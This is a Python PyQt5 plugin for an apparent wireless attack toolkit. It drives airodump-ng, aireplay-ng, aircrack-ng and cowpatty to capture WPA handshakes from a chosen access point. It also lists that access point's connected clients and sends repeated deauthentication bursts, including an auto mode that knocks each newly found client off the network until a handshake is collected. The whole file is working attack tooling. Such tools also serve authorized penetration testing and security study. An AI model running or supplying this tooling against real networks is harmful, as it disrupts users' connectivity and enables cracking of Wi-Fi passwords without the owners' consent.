#!/usr/bin/env python3
import logging
from pathlib import Path
from datetime import datetime
import subprocess
import re
import time
import os
import signal
from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QPushButton,
                             QTextEdit, QLabel, QComboBox, QLineEdit, QSpinBox,
                             QGroupBox, QCheckBox, QSizePolicy)
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from PyQt5.QtGui import QFont

plugin_image_value = "/nsatt/storage/images/icons/capture_deauth_icon.png"

class CaptureThread(QThread):
    """Thread for capturing WPA handshakes using airodump-ng."""
    output_received = pyqtSignal(str)
    handshake_captured = pyqtSignal(str)  # New signal for when handshake is found
    status_update = pyqtSignal()  # New signal for periodic updates

    def __init__(self, adapter, bssid, channel, output_dir):
        super().__init__()
        self.adapter = adapter
        self.bssid = bssid
        self.channel = channel
        self.output_dir = Path(output_dir)
        self.running = True
        self.process = None
        self.verifier = None
        self.capture_file = None
        self.last_status_time = time.time()

    def run(self):
        try:
            self.output_dir.mkdir(parents=True, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.capture_file = self.output_dir / f"handshake_{timestamp}"

            # Start the handshake verifier
            self.verifier = HandshakeVerifier(str(self.capture_file))
            self.verifier.output_received.connect(self.output_received.emit)
            self.verifier.handshake_found.connect(self.handshake_captured.emit)
            self.verifier.start()

            cmd = [
                "airodump-ng",
                "-c", str(self.channel),
                "--bssid", self.bssid,
                "-w", str(self.capture_file),
                self.adapter
            ]
            self.output_received.emit(f"Starting capture with command: {' '.join(cmd)}")

            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                preexec_fn=lambda: os.setpgrp()  # Create new process group
            )
            
            while self.running and self.process.poll() is None:
                # Check for periodic status update
                current_time = time.time()
                if current_time - self.last_status_time >= 60:  # Every 60 seconds
                    self.status_update.emit()
                    self.last_status_time = current_time

                # Non-blocking read with timeout
                try:
                    line = self.process.stderr.readline()
                    if line:
                        self.output_received.emit(line.strip())
                except Exception:
                    pass

        except Exception as e:
            self.output_received.emit(f"Error in CaptureThread: {str(e)}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Clean up processes and resources."""
        try:
            if self.process:
                # First try graceful termination of the process group
                try:
                    pgid = os.getpgid(self.process.pid)
                    os.killpg(pgid, signal.SIGTERM)
                    time.sleep(0.5)  # Give it a moment to terminate gracefully
                except Exception:
                    pass

                # If still running, force kill the process group
                try:
                    if self.process.poll() is None:
                        os.killpg(pgid, signal.SIGKILL)
                except Exception:
                    pass

                # If somehow still running, kill the process directly
                try:
                    if self.process.poll() is None:
                        self.process.kill()
                except Exception:
                    pass

                # Clean up any zombie processes
                try:
                    subprocess.run(['pkill', '-9', 'airodump-ng'], 
                                 stderr=subprocess.DEVNULL, 
                                 stdout=subprocess.DEVNULL)
                except Exception:
                    pass

            if self.verifier:
                self.verifier.stop()
                try:
                    self.verifier.wait(timeout=2000)  # 2 second timeout
                except Exception:
                    pass
                self.verifier = None

            self.process = None
            self.running = False

        except Exception as e:
            self.output_received.emit(f"Error during cleanup: {str(e)}")
        finally:
            # Final cleanup of any remaining airodump processes
            try:
                subprocess.run(['pkill', '-9', 'airodump-ng'], 
                             stderr=subprocess.DEVNULL, 
                             stdout=subprocess.DEVNULL)
            except Exception:
                pass

    def stop(self):
        """Safely stop the capture thread."""
        self.running = False
        self.cleanup()

class DeauthThread(QThread):
    """Thread for sending deauthentication packets using aireplay-ng."""
    output_received = pyqtSignal(str)
    client_found = pyqtSignal(str)  # New signal for found clients

    def __init__(self, adapter, bssid, packet_count=10, interval=15, client_mac=None, auto_mode=False):
        super().__init__()
        self.adapter = adapter
        self.bssid = bssid
        self.packet_count = packet_count
        self.interval = interval
        self.client_mac = client_mac
        self.auto_mode = auto_mode
        self.process = None
        self.running = True
        self.packets_sent = 0

    def run(self):
        try:
            while self.running:
                cmd = [
                    "aireplay-ng",
                    "--deauth", str(self.packet_count),
                    "-a", self.bssid
                ]
                if self.client_mac:
                    cmd.extend(["-c", self.client_mac])
                cmd.append(self.adapter)

                self.output_received.emit(
                    f"Starting deauth burst: {self.packet_count} packets to {self.bssid}" +
                    (f" (client: {self.client_mac})" if self.client_mac else "")
                )

                self.process = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                )
                
                while self.process.poll() is None:
                    for stream in [self.process.stdout, self.process.stderr]:
                        line = stream.readline()
                        if line:
                            self.output_received.emit(line.strip())
                            # Track successful packets
                            if "Sending DeAuth" in line:
                                self.packets_sent += 1
                                self.output_received.emit(f"Deauth packet sent ({self.packets_sent} total)")
                            # Look for client responses
                            if "Client MAC:" in line:
                                client_mac = line.split("Client MAC:")[1].strip()
                                self.client_found.emit(client_mac)
                                self.output_received.emit(f"Detected client response: {client_mac}")

                if not self.auto_mode:
                    break
                    
                if self.auto_mode and self.running:
                    self.output_received.emit(
                        f"Waiting {self.interval} seconds before next deauth burst..."
                    )
                    time.sleep(self.interval)

        except Exception as e:
            self.output_received.emit(f"Error in DeauthThread: {str(e)}")
        finally:
            if self.process:
                self.process.terminate()
            self.output_received.emit(
                f"Deauth completed. Total packets sent: {self.packets_sent}"
            )

    def stop(self):
        self.running = False
        if self.process:
            self.process.terminate()

class HandshakeVerifier(QThread):
    """Thread for verifying captured handshakes using aircrack-ng and cowpatty."""
    handshake_found = pyqtSignal(str)  # Emits path to verified handshake
    output_received = pyqtSignal(str)

    def __init__(self, capture_file_prefix):
        super().__init__()
        self.capture_file_prefix = capture_file_prefix
        self.running = True

    def run(self):
        try:
            while self.running:
                # Check for cap files with our prefix
                capture_dir = Path(self.capture_file_prefix).parent
                base_name = Path(self.capture_file_prefix).name
                
                for cap_file in capture_dir.glob(f"{base_name}*.cap"):
                    if not self.running:
                        break
                        
                    # Try aircrack-ng verification
                    try:
                        cmd = ["aircrack-ng", str(cap_file)]
                        process = subprocess.Popen(
                            cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True
                        )
                        
                        output, _ = process.communicate(timeout=10)
                        if "1 handshake" in output or "Handshake found" in output:
                            # Verify with cowpatty for extra certainty
                            cmd = ["cowpatty", "-c", "-r", str(cap_file)]
                            process = subprocess.Popen(
                                cmd,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                text=True
                            )
                            
                            output, _ = process.communicate(timeout=10)
                            if "Collected all necessary data" in output:
                                self.output_received.emit(f"Valid handshake found in {cap_file}")
                                self.handshake_found.emit(str(cap_file))
                                return  # Exit after finding valid handshake
                            
                    except subprocess.TimeoutExpired:
                        process.kill()
                    except Exception as e:
                        self.output_received.emit(f"Error verifying {cap_file}: {str(e)}")
                
                time.sleep(2)  # Check every 2 seconds
                
        except Exception as e:
            self.output_received.emit(f"Error in HandshakeVerifier: {str(e)}")

    def stop(self):
        self.running = False

class ClientScanner(QThread):
    """Thread for monitoring and detecting client associations."""
    client_found = pyqtSignal(str, str)  # Emits (client_mac, ap_mac)
    output_received = pyqtSignal(str)

    def __init__(self, adapter, target_bssid):
        super().__init__()
        self.adapter = adapter
        self.target_bssid = target_bssid
        self.running = True
        self.process = None

    def run(self):
        try:
            cmd = [
                "airodump-ng",
                "--bssid", self.target_bssid,
                "-a",  # Only show associated clients
                "--manufacturer",  # Show manufacturer info
                self.adapter
            ]
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.output_received.emit(f"Starting client scan for {self.target_bssid}")
            last_update = time.time()
            found_clients = set()
            
            while self.running and self.process.poll() is None:
                line = self.process.stderr.readline()
                if line:
                    # Look for client lines in airodump output
                    if self.target_bssid.lower() in line.lower():
                        client_match = re.search(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", line, re.I)
                        if client_match and client_match.group() != self.target_bssid:
                            client_mac = client_match.group()
                            if client_mac not in found_clients:
                                found_clients.add(client_mac)
                                self.client_found.emit(client_mac, self.target_bssid)
                                self.output_received.emit(
                                    f"New client detected: {client_mac}\n"
                                    f"Total clients found: {len(found_clients)}"
                                )
                
                # Periodic status update
                current_time = time.time()
                if current_time - last_update >= 30:  # Every 30 seconds
                    self.output_received.emit(
                        f"Client scan status:\n"
                        f"Target AP: {self.target_bssid}\n"
                        f"Known clients: {len(found_clients)}\n"
                        f"Active scan continuing..."
                    )
                    last_update = current_time

        except Exception as e:
            self.output_received.emit(f"Error in ClientScanner: {str(e)}")
        finally:
            if self.process:
                self.process.terminate()
            self.output_received.emit("Client scanner stopped")

    def stop(self):
        self.running = False
        if self.process:
            self.process.terminate()

class Plugin:
    """Main plugin class for capture and deauth operations."""
    NAME = "Capture/Deauth"
    CATEGORY = "Networking"
    DESCRIPTION = "Capture WPA handshakes and perform deauth attacks"

    def __init__(self):
        self.widget = None
        self.capture_thread = None
        self.deauth_thread = None
        self.adapter_combo = None
        self.console = None
        self.target_bssid = None
        self.target_channel = None
        self.deauth_btn = None
        self.capture_btn = None
        self.advanced_visible = False
        self.client_mac = None
        self.target_data = {}
        self.client_scanner = None
        self.handshake_captured = False
        self.handshake_count = 0
        self.status_dialog = None

    def get_widget(self):
        if not self.widget:
            self.widget = QWidget()
            layout = QVBoxLayout()

            # Adapter selection
            adapter_layout = QHBoxLayout()
            adapter_label = QLabel("Select Monitor Mode Adapter:")
            self.adapter_combo = QComboBox()
            self.refresh_adapters()
            refresh_btn = QPushButton("Refresh")
            refresh_btn.clicked.connect(self.refresh_adapters)

            adapter_layout.addWidget(adapter_label)
            adapter_layout.addWidget(self.adapter_combo)
            adapter_layout.addWidget(refresh_btn)
            layout.addLayout(adapter_layout)

            # Target settings
            target_layout = QVBoxLayout()

            # BSSID header row
            bssid_header = QHBoxLayout()
            bssid_label = QLabel("Target BSSID:")
            refresh_targets_btn = QPushButton("Refresh Targets")
            refresh_targets_btn.clicked.connect(self.refresh_targets)
            bssid_header.addWidget(bssid_label)
            bssid_header.addStretch()
            bssid_header.addWidget(refresh_targets_btn)
            target_layout.addLayout(bssid_header)

            # BSSID dropdown on next row
            self.target_bssid = QComboBox()
            self.target_bssid.setEditable(True)
            self.refresh_targets()
            target_layout.addWidget(self.target_bssid)

            channel_layout = QHBoxLayout()
            channel_label = QLabel("Channel:")
            self.target_channel = QSpinBox()
            self.target_channel.setRange(1, 14)
            channel_layout.addWidget(channel_label)
            channel_layout.addWidget(self.target_channel)
            target_layout.addLayout(channel_layout)

            layout.addLayout(target_layout)

            # Advanced section
            advanced_btn = QPushButton("Advanced")
            advanced_btn.setCheckable(True)
            advanced_btn.clicked.connect(self.toggle_advanced)
            layout.addWidget(advanced_btn)

            self.advanced_group = QGroupBox("Advanced Options")
            advanced_layout = QVBoxLayout()

            client_layout = QHBoxLayout()
            client_label = QLabel("Client MAC (optional):")
            self.client_mac = QLineEdit()
            client_layout.addWidget(client_label)
            client_layout.addWidget(self.client_mac)
            advanced_layout.addLayout(client_layout)

            # Add associated clients list
            clients_label = QLabel("Associated Clients:")
            self.clients_list = QComboBox()
            self.clients_list.currentTextChanged.connect(self.client_selected)
            advanced_layout.addWidget(clients_label)
            advanced_layout.addWidget(self.clients_list)

            # Add deauth settings
            deauth_settings = QGroupBox("Deauth Settings")
            deauth_layout = QHBoxLayout()
            
            # Packet count setting
            packet_layout = QHBoxLayout()
            packet_label = QLabel("Packets:")
            self.packet_count = QSpinBox()
            self.packet_count.setRange(1, 1000)
            self.packet_count.setValue(10)
            self.packet_count.setToolTip("Number of deauth packets to send per burst")
            packet_layout.addWidget(packet_label)
            packet_layout.addWidget(self.packet_count)
            
            # Frequency setting
            freq_layout = QHBoxLayout()
            freq_label = QLabel("Interval (s):")
            self.deauth_interval = QSpinBox()
            self.deauth_interval.setRange(5, 300)
            self.deauth_interval.setValue(15)
            self.deauth_interval.setToolTip("Seconds between deauth bursts in auto mode")
            freq_layout.addWidget(freq_label)
            freq_layout.addWidget(self.deauth_interval)
            
            deauth_layout.addLayout(packet_layout)
            deauth_layout.addLayout(freq_layout)
            deauth_settings.setLayout(deauth_layout)
            advanced_layout.addWidget(deauth_settings)

            self.advanced_group.setLayout(advanced_layout)
            self.advanced_group.setVisible(self.advanced_visible)
            layout.addWidget(self.advanced_group)

            # Control buttons
            button_layout = QHBoxLayout()
            
            # Capture button
            self.capture_btn = QPushButton("Start Capture")
            self.capture_btn.clicked.connect(self.toggle_capture)
            
            # Deauth controls
            deauth_controls = QHBoxLayout()
            self.deauth_btn = QPushButton("Start Deauth")
            self.deauth_btn.clicked.connect(self.toggle_deauth)
            self.auto_deauth_checkbox = QCheckBox("Auto")
            self.auto_deauth_checkbox.stateChanged.connect(self.update_deauth_button)
            
            deauth_controls.addWidget(self.deauth_btn)
            deauth_controls.addWidget(self.auto_deauth_checkbox)

            button_layout.addWidget(self.capture_btn)
            button_layout.addLayout(deauth_controls)
            layout.addLayout(button_layout)

            # Console output
            self.console = QTextEdit()
            self.console.setReadOnly(True)
            self.console.setFont(QFont("Monospace"))
            self.console.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.console.setMinimumHeight(300)  # Set minimum starting height
            layout.addWidget(self.console, stretch=1)  # Give console stretch priority

            self.widget = QWidget()
            self.widget.setLayout(layout)

        return self.widget

    def toggle_advanced(self):
        self.advanced_visible = not self.advanced_visible
        self.advanced_group.setVisible(self.advanced_visible)

    def refresh_targets(self):
        try:
            targets_dir = Path("/nsatt/storage/saves/wireless/targets")
            if not targets_dir.exists():
                return

            current_text = self.target_bssid.currentText()
            self.target_bssid.clear()
            
            for target_file in targets_dir.glob("*.txt"):
                try:
                    with open(target_file, 'r') as f:
                        content = f.read()
                        bssid_match = re.search(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", content, re.I)
                        ssid_match = re.search(r"SSID:\s*(.+)(?:\n|$)", content)
                        channel_match = re.search(r"Channel:\s*(\d+)", content)
                        
                        if bssid_match:
                            bssid = bssid_match.group()
                            ssid = ssid_match.group(1).strip() if ssid_match else None
                            
                            # Store the mapping
                            self.target_data[bssid] = {
                                'ssid': ssid,
                                'channel': int(channel_match.group(1)) if channel_match else None
                            }
                            
                            # Display SSID (if available) with MAC in parentheses
                            display_text = f"{ssid} ({bssid})" if ssid and ssid != "<length: 0>" else bssid
                            self.target_bssid.addItem(display_text, bssid)  # Store MAC as item data
                            
                            if bssid == current_text or display_text == current_text:
                                self.target_bssid.setCurrentText(display_text)
                                if channel_match:
                                    self.target_channel.setValue(int(channel_match.group(1)))

                except Exception as e:
                    self.log_error(f"Error reading target file {target_file}: {str(e)}")

        except Exception as e:
            self.log_error(f"Error refreshing targets: {str(e)}")

    def refresh_adapters(self):
        try:
            output = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT, universal_newlines=True)
            monitor_adapters = []

            for line in output.split('\n'):
                if "Mode:Monitor" in line:
                    adapter = re.match(r"(\w+)", line)
                    if adapter:
                        monitor_adapters.append(adapter.group(1))

            self.adapter_combo.clear()
            if monitor_adapters:
                self.adapter_combo.addItems(monitor_adapters)
                self.log_message("Found monitor mode adapters: " + ", ".join(monitor_adapters))
            else:
                self.log_error("No adapters in monitor mode found")

        except subprocess.CalledProcessError as e:
            self.log_error(f"Error executing iwconfig: {str(e)}")
        except Exception as e:
            self.log_error(f"Error refreshing adapters: {str(e)}")

    def toggle_capture(self):
        if self.capture_thread and self.capture_thread.isRunning():
            try:
                self.capture_btn.setEnabled(False)  # Disable button during cleanup
                self.capture_btn.setText("Stopping...")
                
                # Stop client scanner first
                if self.client_scanner:
                    try:
                        self.client_scanner.stop()
                        self.client_scanner.wait(timeout=2000)  # 2 second timeout
                    except Exception as e:
                        self.log_error(f"Error stopping client scanner: {str(e)}")
                    finally:
                        self.client_scanner = None

                # Stop capture thread
                try:
                    self.capture_thread.stop()
                    self.capture_thread.wait(timeout=3000)  # 3 second timeout
                    
                    # If thread is still running after timeout, force cleanup
                    if self.capture_thread.isRunning():
                        self.log_error("Capture thread timeout, forcing cleanup...")
                        # Force kill any remaining airodump processes
                        try:
                            subprocess.run(['pkill', '-9', 'airodump-ng'], 
                                         stderr=subprocess.DEVNULL, 
                                         stdout=subprocess.DEVNULL)
                        except Exception:
                            pass
                except Exception as e:
                    self.log_error(f"Error stopping capture thread: {str(e)}")
                finally:
                    self.capture_thread = None
                
                self.capture_btn.setText("Start Capture")
                
            except Exception as e:
                self.log_error(f"Error during capture cleanup: {str(e)}")
            finally:
                self.capture_btn.setEnabled(True)
                # Final cleanup to ensure no processes are left
                try:
                    subprocess.run(['pkill', '-9', 'airodump-ng'], 
                                 stderr=subprocess.DEVNULL, 
                                 stdout=subprocess.DEVNULL)
                except Exception:
                    pass
        else:
            if not self.validate_inputs():
                return

            adapter = self.adapter_combo.currentText()
            bssid = self.get_selected_bssid()
            channel = self.target_channel.value()
            output_dir = "/nsatt/storage/saves/wireless/handshakes"

            # Reset handshake count
            self.handshake_count = 0

            # Start client scanner
            self.client_scanner = ClientScanner(adapter, bssid)
            self.client_scanner.client_found.connect(self.handle_client_found)
            self.client_scanner.output_received.connect(self.update_console)
            self.client_scanner.start()

            # Start capture
            self.capture_thread = CaptureThread(adapter, bssid, channel, output_dir)
            self.capture_thread.output_received.connect(self.update_console)
            self.capture_thread.handshake_captured.connect(self.handle_handshake_captured)
            self.capture_thread.status_update.connect(self.show_status_update)
            self.capture_thread.start()
            self.capture_btn.setText("Stop Capture")

    def toggle_deauth(self):
        if self.deauth_thread and self.deauth_thread.isRunning():
            self.deauth_thread.stop()
            self.deauth_thread.wait()
            self.deauth_btn.setText("Start Deauth" if not self.auto_deauth_checkbox.isChecked() 
                                  else "Start Auto-Deauth")
        else:
            if not self.validate_inputs():
                return

            adapter = self.adapter_combo.currentText()
            bssid = self.get_selected_bssid()
            packet_count = self.packet_count.value()
            interval = self.deauth_interval.value()
            client_mac = self.client_mac.text() if self.advanced_visible else None
            auto_mode = self.auto_deauth_checkbox.isChecked()

            try:
                self.deauth_thread = DeauthThread(
                    adapter, bssid, packet_count, interval, client_mac, auto_mode
                )
                self.deauth_thread.output_received.connect(self.update_console)
                self.deauth_thread.client_found.connect(self.add_client)
                self.deauth_thread.finished.connect(
                    lambda: self.deauth_btn.setText(
                        "Start Auto-Deauth" if auto_mode else "Start Deauth"
                    )
                )
                self.deauth_thread.start()
                self.deauth_btn.setText("Stop Deauth")
                
                self.log_message(
                    f"Started {'auto-' if auto_mode else ''}deauth:\n"
                    f"Packets per burst: {packet_count}\n"
                    f"Interval: {interval} seconds\n"
                    f"Target: {bssid}\n"
                    f"Client: {client_mac if client_mac else 'broadcast'}"
                )
            except Exception as e:
                self.log_error(f"Failed to start deauth: {str(e)}")

    def validate_inputs(self):
        if not self.adapter_combo.currentText():
            self.log_error("No monitor mode adapter selected")
            return False

        current_text = self.target_bssid.currentText()
        
        # Extract MAC from display text if it contains parentheses
        if '(' in current_text:
            mac_match = re.search(r"\((([0-9A-F]{2}:){5}[0-9A-F]{2})\)", current_text, re.I)
            if mac_match:
                current_text = mac_match.group(1)
        
        if not current_text:
            self.log_error("No target BSSID specified")
            return False

        if not re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", current_text, re.I):
            self.log_error("Invalid BSSID format")
            return False

        return True

    def update_console(self, text):
        if self.console:
            self.console.append(text)

    def log_message(self, message):
        if self.console:
            self.console.append(f"[INFO] {message}")

    def log_error(self, message):
        if self.console:
            self.console.append(f"[ERROR] {message}")

    def initialize(self):
        return True

    def terminate(self):
        """Safely clean up resources when plugin is terminated."""
        try:
            if self.client_scanner:
                self.client_scanner.stop()
                try:
                    self.client_scanner.wait(timeout=2000)
                except Exception:
                    pass

            if self.capture_thread:
                self.capture_thread.stop()
                try:
                    self.capture_thread.wait(timeout=2000)
                except Exception:
                    pass

            if self.deauth_thread:
                self.deauth_thread.stop()
                try:
                    self.deauth_thread.wait(timeout=2000)
                except Exception:
                    pass

            # Final cleanup of any remaining processes
            try:
                subprocess.run(['pkill', '-9', 'airodump-ng'], 
                             stderr=subprocess.DEVNULL, 
                             stdout=subprocess.DEVNULL)
                subprocess.run(['pkill', '-9', 'aireplay-ng'], 
                             stderr=subprocess.DEVNULL, 
                             stdout=subprocess.DEVNULL)
            except Exception:
                pass

        except Exception as e:
            logging.error(f"Error during plugin termination: {str(e)}")

    def update_deauth_button(self):
        """Update deauth button text based on checkbox state."""
        if self.auto_deauth_checkbox.isChecked():
            self.deauth_btn.setText("Start Auto-Deauth")
        else:
            self.deauth_btn.setText("Start Deauth")

    def client_selected(self, client_mac):
        """Handle client selection from the dropdown."""
        if client_mac:
            self.client_mac.setText(client_mac)

    def add_client(self, client_mac):
        """Add a new client to the clients list if not already present."""
        if client_mac and self.clients_list:
            current_items = [self.clients_list.itemText(i) for i in range(self.clients_list.count())]
            if client_mac not in current_items:
                self.clients_list.addItem(client_mac)
                self.log_message(f"New client detected: {client_mac}")

    def get_selected_bssid(self):
        """Helper method to get the actual BSSID from the combo box selection."""
        current_text = self.target_bssid.currentText()
        
        # If the text contains a MAC address in parentheses, extract it
        if '(' in current_text:
            mac_match = re.search(r"\((([0-9A-F]{2}:){5}[0-9A-F]{2})\)", current_text, re.I)
            if mac_match:
                return mac_match.group(1)
        
        # Otherwise, return the text as-is (assuming it's a MAC address)
        return current_text

    def handle_client_found(self, client_mac, ap_mac):
        """Handle newly discovered clients."""
        self.add_client(client_mac)
        if self.auto_deauth_checkbox.isChecked() and not self.handshake_captured:
            # Automatically target new clients if in auto mode and no handshake yet
            self.client_mac.setText(client_mac)
            if not (self.deauth_thread and self.deauth_thread.isRunning()):
                self.toggle_deauth()

    def handle_handshake_captured(self, capture_file):
        """Handle successful handshake capture."""
        self.handshake_count += 1
        self.handshake_captured = True
        self.log_message(f"Successfully captured handshake: {capture_file}")
        
        # Stop deauth if it's running
        if self.deauth_thread and self.deauth_thread.isRunning():
            self.deauth_thread.stop()
            self.deauth_thread.wait()
            self.deauth_btn.setText("Start Deauth")
        
        # Optionally stop capture
        if self.capture_thread and self.capture_thread.isRunning():
            self.capture_thread.stop()
            self.capture_thread.wait()
            self.capture_btn.setText("Start Capture")

    def show_status_update(self):
        """Show periodic status update in console."""
        status_text = (f"Capture is running\n"
                      f"Handshakes captured: {self.handshake_count}\n"
                      f"Auto-deauth: {'Active' if self.auto_deauth_checkbox.isChecked() else 'Inactive'}")
        
        self.update_console(status_text)
